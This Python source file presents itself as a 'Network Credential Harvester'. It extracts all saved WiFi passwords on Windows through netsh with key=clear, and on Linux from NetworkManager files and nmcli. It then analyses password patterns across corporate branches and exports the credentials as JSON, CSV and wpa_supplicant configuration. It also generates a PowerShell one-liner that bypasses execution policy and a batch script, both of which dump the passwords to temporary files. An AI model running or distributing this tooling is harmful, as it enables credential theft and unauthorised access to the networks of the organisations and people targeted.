#!/usr/bin/env python3
"""
Automated WiFi Grabber - Network Credential Harvester
=====================================================
Kayıtlı tüm WiFi şifrelerini çek, haritasını çıkar ve
kurumsal şubelerde kullanılan şifre pattern'lerini analiz et.

Author: CyberPunk Team
Version: 1.0.0 PRO
"""

import os
import re
import json
import subprocess
from datetime import datetime
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Set
from enum import Enum
from collections import Counter
import hashlib


class AuthenticationType(Enum):
    """WiFi authentication types"""
    OPEN = "Open"
    WEP = "WEP"
    WPA_PSK = "WPA-Personal"
    WPA2_PSK = "WPA2-Personal"
    WPA3_PSK = "WPA3-Personal"
    WPA_ENTERPRISE = "WPA-Enterprise"
    WPA2_ENTERPRISE = "WPA2-Enterprise"
    UNKNOWN = "Unknown"


class CipherType(Enum):
    """WiFi cipher types"""
    NONE = "None"
    WEP = "WEP"
    TKIP = "TKIP"
    CCMP = "CCMP"
    AES = "AES"
    UNKNOWN = "Unknown"


@dataclass
class WiFiNetwork:
    """Extracted WiFi network information"""
    ssid: str
    password: str = ""
    auth_type: AuthenticationType = AuthenticationType.UNKNOWN
    cipher: CipherType = CipherType.UNKNOWN
    connection_mode: str = "auto"
    is_hidden: bool = False
    mac_randomization: str = "Disabled"
    cost: str = "Unrestricted"
    profile_path: str = ""
    extracted_at: str = field(default_factory=lambda: datetime.now().isoformat())
    
    @property
    def security_score(self) -> int:
        """Calculate security score (0-100)"""
        score = 0
        
        # Authentication type
        auth_scores = {
            AuthenticationType.OPEN: 0,
            AuthenticationType.WEP: 10,
            AuthenticationType.WPA_PSK: 40,
            AuthenticationType.WPA2_PSK: 60,
            AuthenticationType.WPA3_PSK: 80,
            AuthenticationType.WPA_ENTERPRISE: 90,
            AuthenticationType.WPA2_ENTERPRISE: 95
        }
        score += auth_scores.get(self.auth_type, 30)
        
        # Password strength
        if self.password:
            if len(self.password) >= 16:
                score += 5
            elif len(self.password) >= 12:
                score += 3
            
            if re.search(r'[A-Z]', self.password):
                score += 2
            if re.search(r'[0-9]', self.password):
                score += 2
            if re.search(r'[!@#$%^&*(),.?":{}|<>]', self.password):
                score += 3
        
        return min(100, score)
    
    def to_dict(self) -> Dict:
        return {
            "ssid": self.ssid,
            "password": self.password,
            "auth_type": self.auth_type.value,
            "cipher": self.cipher.value,
            "connection_mode": self.connection_mode,
            "is_hidden": self.is_hidden,
            "mac_randomization": self.mac_randomization,
            "security_score": self.security_score,
            "extracted_at": self.extracted_at
        }


@dataclass
class PasswordPattern:
    """Detected password pattern"""
    pattern_type: str  # e.g., "company_name", "year", "location"
    pattern_value: str
    occurrences: int
    affected_networks: List[str] = field(default_factory=list)
    risk_level: str = "medium"  # low, medium, high
    
    def to_dict(self) -> Dict:
        return {
            "type": self.pattern_type,
            "value": self.pattern_value,
            "occurrences": self.occurrences,
            "affected_networks": self.affected_networks,
            "risk_level": self.risk_level
        }


@dataclass  
class BranchAnalysis:
    """Analysis of WiFi across corporate branches"""
    branch_identifier: str
    networks: List[WiFiNetwork] = field(default_factory=list)
    common_patterns: List[str] = field(default_factory=list)
    security_score: int = 0
    recommendations: List[str] = field(default_factory=list)
    
    def to_dict(self) -> Dict:
        return {
            "branch": self.branch_identifier,
            "network_count": len(self.networks),
            "networks": [n.to_dict() for n in self.networks],
            "common_patterns": self.common_patterns,
            "security_score": self.security_score,
            "recommendations": self.recommendations
        }


class WiFiGrabber:
    """
    Automated WiFi Password Grabber
    ===============================
    Extract saved WiFi credentials and analyze password patterns.
    
    Features:
    - Extract all saved WiFi profiles
    - Decrypt and display passwords
    - Analyze password patterns
    - Detect corporate branch patterns
    - Export in multiple formats
    """
    
    # Common password patterns to detect
    COMMON_PATTERNS = {
        "years": [str(y) for y in range(2015, 2030)],
        "seasons": ["spring", "summer", "fall", "winter", "yaz", "kis", "bahar", "sonbahar"],
        "months": ["january", "february", "march", "april", "may", "june", 
                  "july", "august", "september", "october", "november", "december",
                  "ocak", "subat", "mart", "nisan", "mayis", "haziran",
                  "temmuz", "agustos", "eylul", "ekim", "kasim", "aralik"],
        "common_words": ["password", "admin", "guest", "wifi", "network", "secure",
                        "sifre", "misafir", "yonetici", "internet"],
        "sequences": ["12345", "123456", "1234567", "12345678", "qwerty", "abc123"],
        "company_suffixes": ["corp", "inc", "ltd", "llc", "wifi", "net", "guest", "branch"]
    }
    
    def __init__(self):
        self.networks: List[WiFiNetwork] = []
        self.patterns: List[PasswordPattern] = []
        self.is_windows = os.name == 'nt'
    
    def _run_command(self, command: List[str]) -> Tuple[str, str, int]:
        """Run a command and return output"""
        try:
            process = subprocess.Popen(
                command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                shell=self.is_windows
            )
            stdout, stderr = process.communicate(timeout=30)
            
            # Handle encoding for Windows
            encoding = 'cp1252' if self.is_windows else 'utf-8'
            try:
                stdout = stdout.decode(encoding)
            except UnicodeDecodeError:
                stdout = stdout.decode('utf-8', errors='ignore')
            
            try:
                stderr = stderr.decode(encoding)
            except UnicodeDecodeError:
                stderr = stderr.decode('utf-8', errors='ignore')
            
            return stdout, stderr, process.returncode
            
        except subprocess.TimeoutExpired:
            process.kill()
            return "", "Command timed out", 1
        except Exception as e:
            return "", str(e), 1
    
    def get_saved_profiles(self) -> List[str]:
        """Get list of saved WiFi profiles"""
        if not self.is_windows:
            return self._get_linux_profiles()
        
        stdout, _, retcode = self._run_command(['netsh', 'wlan', 'show', 'profiles'])
        
        if retcode != 0:
            return []
        
        profiles = []
        for line in stdout.split('\n'):
            if "All User Profile" in line or "Tüm Kullanıcı Profili" in line:
                # Extract profile name
                match = re.search(r':\s*(.+)$', line.strip())
                if match:
                    profile = match.group(1).strip()
                    if profile:
                        profiles.append(profile)
        
        return profiles
    
    def _get_linux_profiles(self) -> List[str]:
        """Get WiFi profiles on Linux (NetworkManager)"""
        profiles = []
        
        # Try NetworkManager
        nm_path = "/etc/NetworkManager/system-connections"
        if os.path.exists(nm_path):
            for f in os.listdir(nm_path):
                if f.endswith('.nmconnection'):
                    profiles.append(f.replace('.nmconnection', ''))
                else:
                    profiles.append(f)
        
        return profiles
    
    def get_profile_details(self, profile_name: str) -> Optional[WiFiNetwork]:
        """Get detailed information for a WiFi profile including password"""
        if not self.is_windows:
            return self._get_linux_profile_details(profile_name)
        
        # Get profile with key=clear to show password
        stdout, _, retcode = self._run_command([
            'netsh', 'wlan', 'show', 'profile', 
            f'name={profile_name}', 'key=clear'
        ])
        
        if retcode != 0:
            return None
        
        network = WiFiNetwork(ssid=profile_name)
        
        for line in stdout.split('\n'):
            line = line.strip()
            
            # Password (Key Content)
            if "Key Content" in line or "Anahtar İçeriği" in line:
                match = re.search(r':\s*(.+)$', line)
                if match:
                    network.password = match.group(1).strip()
            
            # Authentication
            elif "Authentication" in line or "Kimlik Doğrulama" in line:
                auth = line.split(':')[-1].strip().lower()
                if 'open' in auth:
                    network.auth_type = AuthenticationType.OPEN
                elif 'wep' in auth:
                    network.auth_type = AuthenticationType.WEP
                elif 'wpa3' in auth:
                    network.auth_type = AuthenticationType.WPA3_PSK
                elif 'wpa2-personal' in auth or 'wpa2-kişisel' in auth:
                    network.auth_type = AuthenticationType.WPA2_PSK
                elif 'wpa2-enterprise' in auth or 'wpa2-kurumsal' in auth:
                    network.auth_type = AuthenticationType.WPA2_ENTERPRISE
                elif 'wpa-personal' in auth or 'wpa-kişisel' in auth:
                    network.auth_type = AuthenticationType.WPA_PSK
                elif 'wpa-enterprise' in auth or 'wpa-kurumsal' in auth:
                    network.auth_type = AuthenticationType.WPA_ENTERPRISE
            
            # Cipher
            elif "Cipher" in line or "Şifreleme" in line:
                cipher = line.split(':')[-1].strip().upper()
                if 'CCMP' in cipher or 'AES' in cipher:
                    network.cipher = CipherType.CCMP
                elif 'TKIP' in cipher:
                    network.cipher = CipherType.TKIP
                elif 'WEP' in cipher:
                    network.cipher = CipherType.WEP
                elif 'NONE' in cipher:
                    network.cipher = CipherType.NONE
            
            # Connection mode
            elif "Connection mode" in line or "Bağlantı modu" in line:
                network.connection_mode = line.split(':')[-1].strip()
            
            # Hidden network
            elif "SSID name" in line and "hidden" in line.lower():
                network.is_hidden = True
            
            # MAC randomization
            elif "MAC Randomization" in line or "MAC Rastgeleleştirme" in line:
                network.mac_randomization = line.split(':')[-1].strip()
            
            # Cost
            elif "Cost" in line or "Maliyet" in line:
                network.cost = line.split(':')[-1].strip()
        
        return network
    
    def _get_linux_profile_details(self, profile_name: str) -> Optional[WiFiNetwork]:
        """Get WiFi profile details on Linux"""
        nm_paths = [
            f"/etc/NetworkManager/system-connections/{profile_name}.nmconnection",
            f"/etc/NetworkManager/system-connections/{profile_name}"
        ]
        
        for nm_path in nm_paths:
            if os.path.exists(nm_path):
                try:
                    with open(nm_path, 'r') as f:
                        content = f.read()
                    
                    network = WiFiNetwork(ssid=profile_name)
                    
                    # Extract PSK
                    psk_match = re.search(r'psk=(.+)', content)
                    if psk_match:
                        network.password = psk_match.group(1).strip()
                    
                    # Extract security type
                    if 'key-mgmt=wpa-psk' in content:
                        network.auth_type = AuthenticationType.WPA2_PSK
                    elif 'key-mgmt=sae' in content:
                        network.auth_type = AuthenticationType.WPA3_PSK
                    elif 'key-mgmt=wpa-eap' in content:
                        network.auth_type = AuthenticationType.WPA2_ENTERPRISE
                    
                    return network
                    
                except PermissionError:
                    pass
        
        # Try nmcli as fallback
        try:
            stdout, _, retcode = self._run_command([
                'nmcli', '-s', 'connection', 'show', profile_name
            ])
            
            if retcode == 0:
                network = WiFiNetwork(ssid=profile_name)
                
                for line in stdout.split('\n'):
                    if '802-11-wireless-security.psk:' in line:
                        network.password = line.split(':')[-1].strip()
                    elif '802-11-wireless-security.key-mgmt:' in line:
                        key_mgmt = line.split(':')[-1].strip()
                        if key_mgmt == 'wpa-psk':
                            network.auth_type = AuthenticationType.WPA2_PSK
                        elif key_mgmt == 'sae':
                            network.auth_type = AuthenticationType.WPA3_PSK
                
                return network
        except Exception:
            pass
        
        return None
    
    def extract_all(self) -> List[WiFiNetwork]:
        """Extract all saved WiFi networks with passwords"""
        profiles = self.get_saved_profiles()
        
        for profile in profiles:
            network = self.get_profile_details(profile)
            if network:
                self.networks.append(network)
        
        return self.networks
    
    def analyze_patterns(self) -> List[PasswordPattern]:
        """Analyze password patterns across all networks"""
        passwords = [n.password.lower() for n in self.networks if n.password]
        self.patterns = []
        
        # Year patterns
        year_networks = {}
        for network in self.networks:
            if not network.password:
                continue
            for year in self.COMMON_PATTERNS["years"]:
                if year in network.password:
                    if year not in year_networks:
                        year_networks[year] = []
                    year_networks[year].append(network.ssid)
        
        for year, ssids in year_networks.items():
            if len(ssids) >= 1:
                self.patterns.append(PasswordPattern(
                    pattern_type="year",
                    pattern_value=year,
                    occurrences=len(ssids),
                    affected_networks=ssids,
                    risk_level="high" if len(ssids) > 2 else "medium"
                ))
        
        # Sequence patterns
        for network in self.networks:
            if not network.password:
                continue
            for seq in self.COMMON_PATTERNS["sequences"]:
                if seq in network.password.lower():
                    self.patterns.append(PasswordPattern(
                        pattern_type="weak_sequence",
                        pattern_value=seq,
                        occurrences=1,
                        affected_networks=[network.ssid],
                        risk_level="high"
                    ))
        
        # Common word patterns
        for network in self.networks:
            if not network.password:
                continue
            pwd_lower = network.password.lower()
            for word in self.COMMON_PATTERNS["common_words"]:
                if word in pwd_lower:
                    self.patterns.append(PasswordPattern(
                        pattern_type="common_word",
                        pattern_value=word,
                        occurrences=1,
                        affected_networks=[network.ssid],
                        risk_level="medium"
                    ))
        
        # SSID-based password detection (password contains SSID)
        for network in self.networks:
            if not network.password:
                continue
            ssid_parts = re.split(r'[-_\s]', network.ssid.lower())
            for part in ssid_parts:
                if len(part) > 3 and part in network.password.lower():
                    self.patterns.append(PasswordPattern(
                        pattern_type="ssid_in_password",
                        pattern_value=part,
                        occurrences=1,
                        affected_networks=[network.ssid],
                        risk_level="high"
                    ))
        
        # Short password detection
        for network in self.networks:
            if network.password and len(network.password) < 10:
                self.patterns.append(PasswordPattern(
                    pattern_type="short_password",
                    pattern_value=f"{len(network.password)} characters",
                    occurrences=1,
                    affected_networks=[network.ssid],
                    risk_level="high"
                ))
        
        # Detect company naming patterns
        ssid_words = []
        for network in self.networks:
            words = re.split(r'[-_\s]', network.ssid)
            ssid_words.extend([w.lower() for w in words if len(w) > 2])
        
        word_counts = Counter(ssid_words)
        common_words = [word for word, count in word_counts.items() if count >= 2]
        
        # Check if these common words appear in passwords
        for word in common_words:
            affected = []
            for network in self.networks:
                if network.password and word in network.password.lower():
                    affected.append(network.ssid)
            
            if affected:
                self.patterns.append(PasswordPattern(
                    pattern_type="company_name_in_password",
                    pattern_value=word,
                    occurrences=len(affected),
                    affected_networks=affected,
                    risk_level="high"
                ))
        
        return self.patterns
    
    def analyze_branches(self) -> List[BranchAnalysis]:
        """Analyze WiFi patterns across corporate branches"""
        # Group networks by potential branch identifiers
        branch_groups: Dict[str, List[WiFiNetwork]] = {}
        
        for network in self.networks:
            # Try to extract branch identifier from SSID
            ssid = network.ssid
            
            # Common patterns: CompanyName-Branch1, CompanyName_Istanbul, etc.
            match = re.match(r'^(.+?)[-_](.+)$', ssid)
            if match:
                company = match.group(1)
                if company not in branch_groups:
                    branch_groups[company] = []
                branch_groups[company].append(network)
            else:
                # Single SSID, group under "standalone"
                if "standalone" not in branch_groups:
                    branch_groups["standalone"] = []
                branch_groups["standalone"].append(network)
        
        analyses = []
        
        for branch, networks in branch_groups.items():
            if len(networks) < 1:
                continue
            
            analysis = BranchAnalysis(branch_identifier=branch, networks=networks)
            
            # Find common password patterns
            passwords = [n.password for n in networks if n.password]
            
            if passwords:
                # Check for identical passwords
                pwd_counts = Counter(passwords)
                for pwd, count in pwd_counts.items():
                    if count > 1:
                        analysis.common_patterns.append(
                            f"Same password used {count} times"
                        )
                
                # Check for similar passwords
                for i, p1 in enumerate(passwords):
                    for p2 in passwords[i+1:]:
                        similarity = self._calculate_similarity(p1, p2)
                        if 0.5 < similarity < 1.0:
                            analysis.common_patterns.append(
                                f"Similar passwords detected ({int(similarity*100)}% similarity)"
                            )
                            break
            
            # Calculate security score
            if networks:
                analysis.security_score = sum(n.security_score for n in networks) // len(networks)
            
            # Generate recommendations
            if analysis.security_score < 50:
                analysis.recommendations.append("Upgrade to WPA2/WPA3 across all branches")
            if "Same password used" in str(analysis.common_patterns):
                analysis.recommendations.append("Use unique passwords for each network")
            if "Similar passwords" in str(analysis.common_patterns):
                analysis.recommendations.append("Avoid predictable password variations")
            
            analyses.append(analysis)
        
        return analyses
    
    def _calculate_similarity(self, s1: str, s2: str) -> float:
        """Calculate similarity ratio between two strings"""
        if not s1 or not s2:
            return 0.0
        
        # Simple Levenshtein-based similarity
        len1, len2 = len(s1), len(s2)
        if len1 == 0 or len2 == 0:
            return 0.0
        
        # Count matching characters
        matches = sum(1 for c1, c2 in zip(s1, s2) if c1 == c2)
        return matches / max(len1, len2)
    
    def get_networks_for_domain(self, domain_keywords: List[str]) -> List[WiFiNetwork]:
        """Get networks matching domain keywords"""
        matching = []
        
        for network in self.networks:
            ssid_lower = network.ssid.lower()
            for keyword in domain_keywords:
                if keyword.lower() in ssid_lower:
                    matching.append(network)
                    break
        
        return matching
    
    def export_json(self) -> str:
        """Export networks to JSON"""
        return json.dumps({
            "extraction_date": datetime.now().isoformat(),
            "networks": [n.to_dict() for n in self.networks],
            "patterns": [p.to_dict() for p in self.patterns],
            "statistics": self.get_statistics()
        }, indent=2)
    
    def export_csv(self) -> str:
        """Export networks to CSV"""
        lines = ["SSID,Password,Auth Type,Cipher,Security Score"]
        
        for network in self.networks:
            lines.append(
                f'"{network.ssid}","{network.password}","{network.auth_type.value}",'
                f'"{network.cipher.value}",{network.security_score}'
            )
        
        return '\n'.join(lines)
    
    def export_wpa_supplicant(self) -> str:
        """Export to wpa_supplicant.conf format"""
        lines = [
            "# WiFi networks exported by WiFiGrabber",
            f"# Generated: {datetime.now().isoformat()}",
            "",
            "ctrl_interface=/var/run/wpa_supplicant",
            "update_config=1",
            ""
        ]
        
        for network in self.networks:
            lines.append("network={")
            lines.append(f'    ssid="{network.ssid}"')
            
            if network.password:
                if network.auth_type in [AuthenticationType.WPA_PSK, 
                                         AuthenticationType.WPA2_PSK,
                                         AuthenticationType.WPA3_PSK]:
                    lines.append(f'    psk="{network.password}"')
                elif network.auth_type == AuthenticationType.WEP:
                    lines.append(f'    wep_key0="{network.password}"')
            else:
                lines.append("    key_mgmt=NONE")
            
            if network.is_hidden:
                lines.append("    scan_ssid=1")
            
            lines.append("}")
            lines.append("")
        
        return '\n'.join(lines)
    
    def get_statistics(self) -> Dict:
        """Get extraction statistics"""
        auth_types = Counter(n.auth_type.value for n in self.networks)
        
        with_password = sum(1 for n in self.networks if n.password)
        weak_passwords = sum(
            1 for n in self.networks 
            if n.password and len(n.password) < 10
        )
        
        avg_security = 0
        if self.networks:
            avg_security = sum(n.security_score for n in self.networks) // len(self.networks)
        
        return {
            "total_networks": len(self.networks),
            "with_password": with_password,
            "weak_passwords": weak_passwords,
            "average_security_score": avg_security,
            "authentication_types": dict(auth_types),
            "patterns_detected": len(self.patterns),
            "high_risk_patterns": sum(1 for p in self.patterns if p.risk_level == "high")
        }
    
    def generate_powershell_grabber(self) -> str:
        """Generate PowerShell one-liner for WiFi grabbing"""
        return '''
# WiFi Password Grabber - PowerShell
# Run: powershell -ExecutionPolicy Bypass -Command "& { <script> }"

$results = @()
(netsh wlan show profiles) | Select-String "\\:(.+)$" | ForEach-Object {
    $name = $_.Matches.Groups[1].Value.Trim()
    $profile = netsh wlan show profile name="$name" key=clear
    
    $password = ($profile | Select-String "Key Content\\W+\\:(.+)$").Matches.Groups[1].Value.Trim()
    $auth = ($profile | Select-String "Authentication\\W+\\:(.+)$").Matches.Groups[1].Value.Trim()
    
    $results += [PSCustomObject]@{
        SSID = $name
        Password = $password
        Authentication = $auth
    }
}

$results | Format-Table -AutoSize
$results | ConvertTo-Json | Out-File "$env:TEMP\\wifi_passwords.json"
Write-Host "[+] Saved to $env:TEMP\\wifi_passwords.json"
'''
    
    def generate_batch_grabber(self) -> str:
        """Generate batch file for WiFi grabbing"""
        return '''
@echo off
:: WiFi Password Grabber - Batch Script
:: Saves all WiFi passwords to a text file

echo [*] Extracting WiFi passwords...
echo.

set OUTPUT=%TEMP%\\wifi_passwords.txt
echo WiFi Passwords - Extracted %DATE% %TIME% > %OUTPUT%
echo. >> %OUTPUT%

for /f "tokens=2 delims=:" %%a in ('netsh wlan show profiles ^| findstr "Profile"') do (
    set "SSID=%%a"
    call :GetPassword
)

echo.
echo [+] Results saved to: %OUTPUT%
notepad %OUTPUT%
goto :EOF

:GetPassword
set "SSID=%SSID:~1%"
echo [*] Processing: %SSID%
echo. >> %OUTPUT%
echo SSID: %SSID% >> %OUTPUT%
for /f "tokens=2 delims=:" %%b in ('netsh wlan show profile name^="%SSID%" key^=clear ^| findstr "Key Content"') do (
    echo Password:%%b >> %OUTPUT%
)
goto :EOF
'''


# Singleton instance
_grabber = None

def get_grabber() -> WiFiGrabber:
    """Get singleton grabber instance"""
    global _grabber
    if _grabber is None:
        _grabber = WiFiGrabber()
    return _grabber


def demo():
    """Demonstrate WiFi grabber capabilities"""
    print("=" * 60)
    print("Automated WiFi Grabber - Network Credential Harvester")
    print("=" * 60)
    
    grabber = get_grabber()
    
    print("\n[*] Extraction methods:")
    print("    - Windows: netsh wlan show profile key=clear")
    print("    - Linux: NetworkManager/wpa_supplicant")
    
    print("\n[*] Analysis capabilities:")
    print("    - Password pattern detection")
    print("    - Corporate branch analysis")
    print("    - Security score calculation")
    print("    - SSID-in-password detection")
    
    print("\n[*] Export formats:")
    print("    - JSON")
    print("    - CSV")
    print("    - wpa_supplicant.conf")
    
    print("\n[*] Pattern detection:")
    for pattern_type, examples in grabber.COMMON_PATTERNS.items():
        print(f"    - {pattern_type}: {', '.join(examples[:3])}...")
    
    print("\n[*] PowerShell grabber preview:")
    print("-" * 40)
    ps_preview = grabber.generate_powershell_grabber()[:400]
    print(ps_preview + "...")
    
    print("\n[*] Ready for extraction")
    print("-" * 60)


if __name__ == "__main__":
    demo()
